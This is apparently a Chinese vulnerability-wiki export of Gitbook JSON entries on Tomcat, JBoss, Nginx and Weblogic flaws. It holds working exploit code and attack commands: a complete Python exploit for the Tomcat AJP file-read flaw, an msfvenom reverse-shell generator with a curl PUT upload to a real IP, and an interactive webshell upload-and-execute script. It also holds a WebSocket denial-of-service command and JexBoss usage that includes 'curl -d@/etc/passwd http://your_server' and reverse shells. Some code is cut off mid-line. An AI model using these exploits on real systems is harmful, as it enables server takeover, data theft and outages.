0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) 参考文章 Github地址 威胁通告 APACHE TOMCAT 文件包含漏洞（CVE-2020-1938） PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html","title":"Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935","keywords":"","body":"Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 漏洞描述 2020年11月06日，360CERT监测发现@RedTeamPentesting发布了Tomcat WebSokcet 拒绝服务漏洞 的分析报告，该漏洞编号为 CVE-2020-13935 ，漏洞等级：高危 ，漏洞评分：7.5 。 未授权的远程攻击者通过发送 大量特制请求包 到Tomcat服务器 ,可造成服务器停止响应并无法提供正常服务 漏洞影响 [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 漏洞复现 访问目标，查看版本是否在漏洞版本范围内 查看攻击前的内存使用情况 CVE-2020-13935 EXP地址 [!NOTE] EXP使用需要GO环境 如果出现 go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. 需要使用命令切换源 go env -w GOPROXY=https://goproxy.cn 使用EXP攻击 tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU 负荷超载，成功攻击 漏洞利用POC CVE-2020-13935 EXP地址 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html","title":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615","keywords":"","body":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 漏洞描述 2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 影响版本 [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 漏洞产生的主要原因来自于conf/web.xml文件配置错误,readonly开启了false,导致可以使用PUT/DELETE请求方法操作文件 msf生成一个jsp木马 msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp 利用PUT方法上传木马 curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] 注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/中的最后一个\"/\"字符很重要 发现成功上传木马文件 访问文件即可反弹一个shell 也可以使用DELETE请求方法删除文件 漏洞利用POC [!NOTE] 代码只用于检测漏洞，反弹shell参照上方 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(退出交互并删除webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] 含有CVE-2017-12615漏洞，成功上传shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] 成功执行命令,响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] 成功删除shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Jboss/":{"url":"PeiQi_Wiki/Web服务器漏洞/Jboss/","title":"Jboss","keywords":"","body":"Jboss PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Jboss/Scan/":{"url":"PeiQi_Wiki/Web服务器漏洞/Jboss/Scan/","title":"Scan","keywords":"","body":"扫描工具 Jexboss PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html","title":"扫描工具 Jexboss","keywords":"","body":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (Questions, problems, suggestions and etc: joaomatosf@gmail.com PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html","title":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504","keywords":"","body":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 影响版本 [!NOTE] JBoss AS 4.x及之前版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d 漏洞复现 访问控制台 使用工具 Jexboss 进行漏洞扫描 python3 jexboss.py -host http://192.168.51.133:8080 成功利用漏洞执行命令 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Nginx/":{"url":"PeiQi_Wiki/Web服务器漏洞/Nginx/","title":"Nginx","keywords":"","body":"Nginx Nginx越界读取缓存漏洞 CVE-2017-7529 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html","title":"Nginx越界读取缓存漏洞 CVE-2017-7529","keywords":"","body":"Nginx越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 影响版本 [!NOTE] Nginx version 0.5.6 - 1.13.2 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080 正常即可 漏洞复现 使用目录下的POC进行验证 python poc.py http://xxx.xxx.xxx.xxx:8080/ 漏洞利用POC #!/usr/bin/env python import sys import requests if len(sys.argv) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Weblogic/":{"url":"PeiQi_Wiki/Web服务器漏洞/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Weblogic/Scan/":{"url":"PeiQi_Wiki/Web服务器漏洞/Weblogic/Scan/","title":"Scan","keywords":"","body":"扫描工具 WeblogicScanner PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html","title":"扫描工具 WeblogicScanner","keywords":"","body":"WeblogicScanner 漏洞扫描 源工具链接：https://github.com/rabbitmask/WeblogicScan weblogicScaner 简体中文 | English 截至 2020 年 11 月 27 日，weblogic 漏洞扫描工具。若存在未记录且已公开 POC 的漏洞，欢迎提交 issue。 原作者已经收集得比较完整了，在这里做了部分的 bug 修复，部分脚本 POC 未生效，配置错误等问题。之前查了一下发现部分 POC 无法使用。在这个项目里面对脚本做了一些修改，提高准确率。 注意：部分漏洞由于稳定性原因需要多次测试才可验证 目前可检测漏洞编号有（部分非原理检测，需手动验证）： weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 快速开始 依赖 python >= 3.6 进入项目目录，使用以下命令安装依赖库 $ pip3 install requests 使用说明 usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help 帮助信息 -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] 直接填入目标或文件列表（默认使用端口7001）. 例子： 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] 漏洞名称或CVE编号，例子：\"weblogic administrator console\" -o OUTPUT, --output OUTPUT 输出 json 结果的路径。默认不输出结果 -s, --ssl 强制使用 https 协议请求 结果样例 (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! 